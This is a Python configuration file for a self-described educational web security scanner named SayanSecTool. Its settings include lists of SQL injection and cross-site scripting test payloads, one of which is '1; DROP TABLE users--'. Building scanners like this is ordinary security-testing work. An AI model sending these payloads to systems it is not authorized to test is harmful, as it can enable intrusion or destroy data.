"""
Global Configuration for Sayan-Sec-Tool
Educational Research Purpose Only
"""
import os
from dataclasses import dataclass

@dataclass
class Config:
    # Tool Settings
    TOOL_NAME: str = "SayanSecTool"
    VERSION: str = "1.0.0"
    AUTHOR: str = "sayan9168 (CEH)"
    
    # Network Settings
    PROXY_HOST: str = "127.0.0.1"
    PROXY_PORT: int = 8080
    TIMEOUT: int = 10
    MAX_THREADS: int = 5
    MAX_DEPTH: int = 3
    
    # Scanner Settings
    USER_AGENT: str = "SayanSecTool/1.0 (Educational Research)"
    FOLLOW_REDIRECTS: bool = True
    VERIFY_SSL: bool = False  # For lab testing only
    
    # Payloads (Educational - Use Responsibly)
    SQLI_PAYLOADS: list = None
    XSS_PAYLOADS: list = None
    
    def __post_init__(self):
        if self.SQLI_PAYLOADS is None:
            self.SQLI_PAYLOADS = [
                "'", "''", "`", "``", 
                "' OR '1'='1", "' OR 1=1--", 
                "' UNION SELECT NULL--", 
                "admin'--", "1; DROP TABLE users--"
            ]
        if self.XSS_PAYLOADS is None:
            self.XSS_PAYLOADS = [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "<svg onload=alert('XSS')>",
                "javascript:alert('XSS')",
                "<body onload=alert('XSS')>"
            ]
    
    # Output Settings
    LOG_FILE: str = "logs/scan.log"
    REPORT_DIR: str = "reports"
    
    @staticmethod
    def ensure_dirs():
        """Create necessary directories"""
        os.makedirs("logs", exist_ok=True)
        os.makedirs("reports", exist_ok=True)
        os.makedirs("output", exist_ok=True)

# Global config instance
config = Config()
